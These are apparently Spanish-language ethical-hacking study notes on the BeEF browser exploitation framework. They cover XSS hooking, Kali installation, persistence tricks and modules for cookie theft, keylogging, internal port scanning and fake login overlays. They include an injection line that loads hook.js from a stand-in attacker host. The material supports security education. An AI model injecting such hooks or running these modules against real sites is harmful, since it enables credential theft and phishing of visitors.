====================================================
  BeEF - Browser Exploitation Framework
  Apuntes XSS Avanzado | Ethical Hacking
====================================================

¿QUÉ ES BEEF?
-------------
Framework de post-explotación que usa XSS como vector de entrada.
Una vez que la víctima carga el payload, su navegador queda "hookeado"
y aparece en el panel de control del atacante.

No es acceso al sistema — es acceso al navegador como plataforma.


FLUJO BÁSICO
------------
1. Atacante levanta BeEF → panel en http://127.0.0.1:3000/ui/panel
2. Víctima carga una página con XSS inyectado:
     <script src="http://ATACANTE_IP:3000/hook.js"></script>
3. El navegador de la víctima aparece como "Hooked Browser"
4. Atacante ejecuta módulos desde el panel


INSTALACIÓN (Kali)
------------------
  sudo apt install beef-xss -y
  sudo nano /etc/beef-xss/config.yaml   ← cambiar contraseña
  sudo beef-xss


LO QUE PERMITE HACER
--------------------
- Robar cookies (sin HttpOnly)
- Keylogging en la página activa
- Leer el DOM / contenido de página
- Redirigir al usuario
- Ingeniería social (popups, phishing overlay)
- Escanear puertos de la red interna (desde el browser víctima)
- Fingerprinting: OS, plugins, IPs internas
- Explotar vulnerabilidades del propio navegador (CVEs)


LIMITACIONES (sandbox del navegador)
--------------------------------------
- NO puede leer cookies con flag HttpOnly
- NO puede acceder a otros dominios (Same-Origin Policy)
- NO accede directamente al sistema de ficheros
- NO persiste si se cierra... salvo con técnicas de persistencia


PERSISTENCIA — EL PUNTO CLAVE
------------------------------
BeEF crea inicialmente un hook vinculado a la página donde se inyectó el XSS.
Ese hook es el punto de entrada, pero no el fin.

Una vez establecido el hook, se puede activar persistencia en el navegador.
A partir de ese momento:
  → Ya no hace falta que la página con el XSS siga abierta o activa
  → El hook sobrevive mientras el navegador esté abierto
  → Se puede pivotar entre páginas web con el hook activo

Mecanismos principales:
  · Iframe/ventana invisible  → mantiene hook.js cargado en segundo plano
  · Pop-under                 → ventana oculta detrás del navegador activo
  · Man-In-The-Browser (MITB) → intercepta la navegación dentro del dominio

Con persistencia activa:
  → Da igual a qué página vaya el usuario, el atacante "va con él"
  → Se pueden capturar credenciales de cualquier formulario que visite
  → El navegador actúa como implante (similar a un troyano, pero en browser)


MÓDULOS ÚTILES (panel Commands)
--------------------------------
  Get Cookie              → roba cookies de sesión accesibles
  Get Page HTML           → captura el DOM completo
  Port Scanner            → escanea red interna desde el browser víctima
  Alert Dialog            → popup falso (ingeniería social)
  Fingerprint Network     → detecta IPs y servicios internos
  Pretty Theft            → overlay de login falso para robar credenciales


RELACIÓN CON TIPOS DE XSS
--------------------------
  XSS Reflejado   → hook puntual, víctima debe cargar la URL trampa
  XSS Almacenado  → hook automático cada vez que alguien visita la página
                    → mucho más valioso para persistencia real


CONCEPTO IMPORTANTE
-------------------
BeEF convierte el XSS de "puedo mostrar un alert()" a
"tengo el navegador de la víctima como herramienta de ataque persistente".

El salto al sistema operativo requeriría explotar una vulnerabilidad
del propio navegador o del SO (fuera del scope de BeEF por sí solo).
